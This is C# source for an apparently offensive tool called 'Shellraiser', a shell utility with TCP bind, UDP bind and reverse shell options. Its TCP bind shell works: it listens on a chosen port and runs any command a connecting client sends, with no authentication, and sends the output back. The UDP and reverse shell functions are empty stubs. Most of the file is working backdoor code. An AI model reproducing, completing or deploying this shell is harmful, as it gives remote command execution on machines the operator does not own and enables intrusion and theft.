using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Shellraiser
{
    class ShellRunner
    {
        public static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Invalid number of arguments. Usage: ShellRunner OPTION IP_ADDRESS PORT");
                return;
            }

            string option = args[0];
            string ipAddress = args[1];
            int port = int.Parse(args[2]);

            if (option == "-b")
            {
                TCPBind(ipAddress, port);
            }
            else if (option == "-u")
            {
                // call the UDPBind function with the provided IP address and port
                UDPBind(ipAddress, port);
            }
            else if (option == "-r")
            {
                // call the Reverse function with the provided IP address and port
                Reverse(ipAddress, port);
            }
            else
            {
                Console.WriteLine("Invalid option. Usage: ");
                ShowHelp();
                return;
            }
        }
        private static void ShowHelp()
        {
            Console.WriteLine("Usage: ShellRunner OPTION IP_ADDRESS PORT");
            Console.WriteLine("OPTIONS:");
            Console.WriteLine("-b: TCP Bind");
            Console.WriteLine("-u: UDP Bind");
            Console.WriteLine("-r: Reverse");
        }

        private static void TCPBind(string ipAddress, int port)
        {
            TcpListener listener = new TcpListener(IPAddress.Parse(ipAddress), port);
            listener.Start();
            Console.WriteLine("Listening for incoming connections on " + ipAddress + ":" + port);

            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                Console.WriteLine("Received a connection from " + client.Client.RemoteEndPoint);

                using (NetworkStream stream = client.GetStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        while (true)
                        {
                            string command = reader.ReadLine();
                            if (string.IsNullOrEmpty(command))
                            {
                                reader.Close();
                                stream.Close();
                                client.Close();
                                Console.WriteLine("Connection closed by " + client.Client.RemoteEndPoint);
                                break;
                            }

                            if (string.IsNullOrWhiteSpace(command))
                                continue;

                            string[] split = command.Trim().Split(' ');
                            string filename = split.First();
                            string arg = string.Join(" ", split.Skip(1));

                            try
                            {
                                Process prc = new Process();
                                prc.StartInfo = new ProcessStartInfo();
                                prc.StartInfo.FileName = filename;
                                prc.StartInfo.Arguments = arg;
                                prc.StartInfo.UseShellExecute = false;
                                prc.StartInfo.RedirectStandardOutput = true;
                                prc.Start();
                                prc.StandardOutput.BaseStream.CopyTo(stream);
                                prc.WaitForExit();
                            }
                            catch
                            {
                                string error = "Error running command " + command + "\n";
                                byte[] errorBytes = Encoding.ASCII.GetBytes(error);
                                stream.Write(errorBytes, 0, errorBytes.Length);
                            }
                        }
                    }
                }
            }
        }

        private static void UDPBind(string ipAddress, int port)
        {
            // your code for the UDP bind option here
        }

        private static void Reverse(string ipAddress, int port)
        {
            // your code for the reverse option here
        }
    }




}







  